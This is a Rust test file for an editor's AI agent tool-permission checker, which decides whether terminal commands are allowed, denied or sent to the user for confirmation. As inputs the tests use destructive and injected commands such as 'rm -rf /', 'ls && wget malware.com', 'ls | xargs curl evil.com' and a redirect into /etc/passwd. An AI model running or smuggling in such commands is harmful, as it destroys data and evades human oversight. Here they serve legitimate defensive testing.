use super::*;

#[test]
fn old_anchored_pattern_no_longer_matches_env_prefixed_command() {
    t("PAGER=blah git log").allow(&["^git\\b"]).is_confirm();
}

#[test]
fn env_prefixed_allow_pattern_matches_env_prefixed_command() {
    t("PAGER=blah git log --oneline")
        .allow(&["^PAGER=blah\\s+git\\s+log(\\s|$)"])
        .is_allow();
}

#[test]
fn env_prefixed_allow_pattern_requires_matching_env_value() {
    t("PAGER=more git log --oneline")
        .allow(&["^PAGER=blah\\s+git\\s+log(\\s|$)"])
        .is_confirm();
}

#[test]
fn env_prefixed_allow_patterns_require_all_extracted_commands_to_match() {
    t("PAGER=blah git log && git status")
        .allow(&["^PAGER=blah\\s+git\\s+log(\\s|$)"])
        .is_confirm();
}

#[test]
fn hardcoded_security_denial_overrides_unconditional_allow_all() {
    let decision = no_rules("rm -rf /", ToolPermissionMode::Allow);
    match decision {
        ToolPermissionDecision::Deny(message) => {
            assert!(
                message.contains("built-in security rule"),
                "expected hardcoded denial message, got: {message}"
            );
        }
        other => panic!("expected Deny, got {other:?}"),
    }
}

#[test]
fn hardcoded_security_denial_overrides_unconditional_allow_all_for_invalid_command() {
    let decision = no_rules("echo $(rm -rf /)", ToolPermissionMode::Allow);
    match decision {
        ToolPermissionDecision::Deny(message) => {
            assert!(
                message.contains("built-in security rule"),
                "expected hardcoded denial message, got: {message}"
            );
        }
        other => panic!("expected Deny, got {other:?}"),
    }
}

#[test]
fn shell_injection_via_double_ampersand_not_allowed() {
    t("ls && wget malware.com").allow(&["^ls"]).is_confirm();
}

#[test]
fn shell_injection_via_semicolon_not_allowed() {
    t("ls; wget malware.com").allow(&["^ls"]).is_confirm();
}

#[test]
fn shell_injection_via_pipe_not_allowed() {
    t("ls | xargs curl evil.com").allow(&["^ls"]).is_confirm();
}

#[test]
fn shell_injection_via_backticks_not_allowed() {
    t("echo `wget malware.com`")
        .allow(&[pattern("echo")])
        .is_deny();
}

#[test]
fn shell_injection_via_dollar_parens_not_allowed() {
    t("echo $(wget malware.com)")
        .allow(&[pattern("echo")])
        .is_deny();
}

#[test]
fn shell_injection_via_or_operator_not_allowed() {
    t("ls || wget malware.com").allow(&["^ls"]).is_confirm();
}

#[test]
fn shell_injection_via_background_operator_not_allowed() {
    t("ls & wget malware.com").allow(&["^ls"]).is_confirm();
}

#[test]
fn shell_injection_via_newline_not_allowed() {
    t("ls\nwget malware.com").allow(&["^ls"]).is_confirm();
}

#[test]
fn shell_injection_via_process_substitution_input_not_allowed() {
    t("cat <(wget malware.com)").allow(&["^cat"]).is_deny();
}

#[test]
fn shell_injection_via_process_substitution_output_not_allowed() {
    t("ls >(wget malware.com)").allow(&["^ls"]).is_deny();
}

#[test]
fn shell_injection_without_spaces_not_allowed() {
    t("ls&&wget malware.com").allow(&["^ls"]).is_confirm();
    t("ls;wget malware.com").allow(&["^ls"]).is_confirm();
}

#[test]
fn shell_injection_multiple_chained_operators_not_allowed() {
    t("ls && echo hello && wget malware.com")
        .allow(&["^ls"])
        .is_confirm();
}

#[test]
fn shell_injection_mixed_operators_not_allowed() {
    t("ls; echo hello && wget malware.com")
        .allow(&["^ls"])
        .is_confirm();
}

#[test]
fn shell_injection_pipe_stderr_not_allowed() {
    t("ls |& wget malware.com").allow(&["^ls"]).is_confirm();
}

#[test]
fn allow_requires_all_commands_to_match() {
    t("ls && echo hello").allow(&["^ls", "^echo"]).is_allow();
}

#[test]
fn dev_null_redirect_does_not_cause_false_negative() {
    // Redirects to /dev/null are known-safe and should be skipped during
    // command extraction, so they don't prevent auto-allow from matching.
    t(r#"git log --oneline -20 2>/dev/null || echo "not a git repo or no commits""#)
        .allow(&[r"^git\s+(status|diff|log|show)\b", "^echo"])
        .is_allow();
}

#[test]
fn redirect_to_real_file_still_causes_confirm() {
    // Redirects to real files (not /dev/null) should still be included in
    // the extracted commands, so they prevent auto-allow when unmatched.
    t("echo hello > /etc/passwd").allow(&["^echo"]).is_confirm();
}

#[test]
fn pipe_does_not_cause_false_negative_when_all_commands_match() {
    // A piped command like `echo "y\ny" | git add -p file` produces two commands:
    // "echo y\ny" and "git add -p file". Both should match their respective allow
    // patterns, so the overall command should be auto-allowed.
    t(r#"echo "y\ny" | git add -p crates/acp_thread/src/acp_thread.rs"#)
        .allow(&[
            r"^git\s+(--no-pager\s+)?(fetch|status|diff|log|show|add|commit|push|checkout\s+-b)\b",
            "^echo",
        ])
        .is_allow();
}

#[test]
fn deny_triggers_on_any_matching_command() {
    t("ls && rm file").allow(&["^ls"]).deny(&["^rm"]).is_deny();
}

#[test]
fn deny_catches_injected_command() {
    t("ls && rm -rf ./temp")
        .allow(&["^ls"])
        .deny(&["^rm"])
        .is_deny();
}

#[test]
fn confirm_triggers_on_any_matching_command() {
    t("ls && sudo reboot")
        .allow(&["^ls"])
        .confirm(&["^sudo"])
        .is_confirm();
}

#[test]
fn always_allow_button_works_end_to_end() {
    // This test verifies that the "Always Allow" button behavior works correctly:
    // 1. User runs a command like "cargo build --release"
    // 2. They click "Always Allow for `cargo build` commands"
    // 3. The pattern extracted should match future "cargo build" commands
    //    but NOT other cargo subcommands like "cargo test"
    let original_command = "cargo build --release";
    let extracted_pattern = pattern(original_command);

    // The extracted pattern should allow the original command
    t(original_command).allow(&[extracted_pattern]).is_allow();

    // It should allow other "cargo build" invocations with different flags
    t("cargo build").allow(&[extracted_pattern]).is_allow();
    t("cargo build --features foo")
        .allow(&[extracted_pattern])
        .is_allow();

    // But NOT other cargo subcommands — the pattern is subcommand-specific
    t("cargo test").allow(&[extracted_pattern]).is_confirm();
    t("cargo fmt").allow(&[extracted_pattern]).is_confirm();

    // Hyphenated extensions of the subcommand should not match either
    // (e.g. cargo plugins like "cargo build-foo")
    t("cargo build-foo")
        .allow(&[extracted_pattern])
        .is_confirm();
    t("cargo builder").allow(&[extracted_pattern]).is_confirm();

    // But not commands with different base commands
    t("npm install").allow(&[extracted_pattern]).is_confirm();

    // Chained commands: all must match the pattern
    t("cargo build && cargo build --release")
        .allow(&[extracted_pattern])
        .is_allow();

    // But reject if any subcommand doesn't match
    t("cargo build && npm install")
        .allow(&[extracted_pattern])
        .is_confirm();
}

#[test]
fn always_allow_button_works_without_subcommand() {
    // When the second token is a flag (e.g. "ls -la"), the extracted pattern
    // should only include the command name, not the flag.
    let original_command = "ls -la";
    let extracted_pattern = pattern(original_command);

    // The extracted pattern should allow the original command
    t(original_command).allow(&[extracted_pattern]).is_allow();

    // It should allow other invocations of the same command
    t("ls").allow(&[extracted_pattern]).is_allow();
    t("ls -R /tmp").allow(&[extracted_pattern]).is_allow();

    // But not different commands
    t("cat file.txt").allow(&[extracted_pattern]).is_confirm();

    // Chained commands: all must match
    t("ls -la && ls /tmp")
        .allow(&[extracted_pattern])
        .is_allow();
    t("ls -la && cat file.txt")
        .allow(&[extracted_pattern])
        .is_confirm();
}

#[test]
fn nested_command_substitution_is_denied() {
    t("echo $(cat $(whoami).txt)")
        .allow(&["^echo", "^cat", "^whoami"])
        .is_deny();
}

#[test]
fn parse_failure_is_denied() {
    t("ls &&").allow(&["^ls$"]).is_deny();
}

#[test]
fn mcp_tool_default_modes() {
    t("")
        .tool("mcp:fs:read")
        .mode(ToolPermissionMode::Allow)
        .is_allow();
    t("")
        .tool("mcp:bad:del")
        .mode(ToolPermissionMode::Deny)
        .is_deny();
    t("")
        .tool("mcp:gh:issue")
        .mode(ToolPermissionMode::Confirm)
        .is_confirm();
    t("")
        .tool("mcp:gh:issue")
        .mode(ToolPermissionMode::Confirm)
        .global_default(ToolPermissionMode::Allow)
        .is_confirm();
}

#[test]
fn mcp_doesnt_collide_with_builtin() {
    let mut tools = collections::HashMap::default();
    tools.insert(
        Arc::from(TerminalTool::NAME),
        ToolRules {
            default: Some(ToolPermissionMode::Deny),
            always_allow: vec![],
            always_deny: vec![],
            always_confirm: vec![],
            invalid_patterns: vec![],
        },
    );
    tools.insert(
        Arc::from("mcp:srv:terminal"),
        ToolRules {
            default: Some(ToolPermissionMode::Allow),
            always_allow: vec![],
            always_deny: vec![],
            always_confirm: vec![],
            invalid_patterns: vec![],
        },
    );
    let p = ToolPermissions {
        default: ToolPermissionMode::Confirm,
        tools,
    };
    assert!(matches!(
        ToolPermissionDecision::from_input(
            TerminalTool::NAME,
            &["x".to_string()],
            &p,
            ShellKind::Posix
        ),
        ToolPermissionDecision::Deny(_)
    ));
    assert_eq!(
        ToolPermissionDecision::from_input(
            "mcp:srv:terminal",
            &["x".to_string()],
            &p,
            ShellKind::Posix
        ),
        ToolPermissionDecision::Allow
    );
}

#[test]
fn case_insensitive_by_default() {
    t("CARGO TEST").allow(&[pattern("cargo")]).is_allow();
    t("Cargo Test").allow(&[pattern("cargo")]).is_allow();
}

#[test]
fn case_sensitive_allow() {
    t("cargo test")
        .allow_case_sensitive(&[pattern("cargo")])
        .is_allow();
    t("CARGO TEST")
        .allow_case_sensitive(&[pattern("cargo")])
        .is_confirm();
}

#[test]
fn case_sensitive_deny() {
    t("rm -rf ./temp")
        .deny_case_sensitive(&[pattern("rm")])
        .is_deny();
    t("RM -RF ./temp")
        .deny_case_sensitive(&[pattern("rm")])
        .mode(ToolPermissionMode::Allow)
        .is_allow();
}

#[test]
fn nushell_allows_with_allow_pattern() {
    t("ls").allow(&["^ls"]).shell(ShellKind::Nushell).is_allow();
}

#[test]
fn nushell_allows_deny_patterns() {
    t("rm -rf ./temp")
        .deny(&["rm\\s+-rf"])
        .shell(ShellKind::Nushell)
        .is_deny();
}

#[test]
fn nushell_allows_confirm_patterns() {
    t("sudo reboot")
        .confirm(&["sudo"])
        .shell(ShellKind::Nushell)
        .is_confirm();
}

#[test]
fn nushell_no_allow_patterns_uses_default() {
    t("ls")
        .deny(&["rm"])
        .mode(ToolPermissionMode::Allow)
        .shell(ShellKind::Nushell)
        .is_allow();
}

#[test]
fn elvish_allows_with_allow_pattern() {
    t("ls").allow(&["^ls"]).shell(ShellKind::Elvish).is_allow();
}

#[test]
fn rc_allows_with_allow_pattern() {
    t("ls").allow(&["^ls"]).shell(ShellKind::Rc).is_allow();
}

#[test]
fn multiple_invalid_patterns_pluralizes_message() {
    let mut tools = collections::HashMap::default();
    tools.insert(
        Arc::from(TerminalTool::NAME),
        ToolRules {
            default: Some(ToolPermissionMode::Allow),
            always_allow: vec![],
            always_deny: vec![],
            always_confirm: vec![],
            invalid_patterns: vec![
                InvalidRegexPattern {
                    pattern: "[bad1".into(),
                    rule_type: "always_deny".into(),
                    error: "err1".into(),
                },
                InvalidRegexPattern {
                    pattern: "[bad2".into(),
                    rule_type: "always_allow".into(),
                    error: "err2".into(),
                },
            ],
        },
    );
    let p = ToolPermissions {
        default: ToolPermissionMode::Confirm,
        tools,
    };

    let result = ToolPermissionDecision::from_input(
        TerminalTool::NAME,
        &["echo hi".to_string()],
        &p,
        ShellKind::Posix,
    );
    match result {
        ToolPermissionDecision::Deny(msg) => {
            assert!(
                msg.contains("2 regex patterns"),
                "Expected '2 regex patterns' in message, got: {}",
                msg
            );
        }
        other => panic!("Expected Deny, got {:?}", other),
    }
}
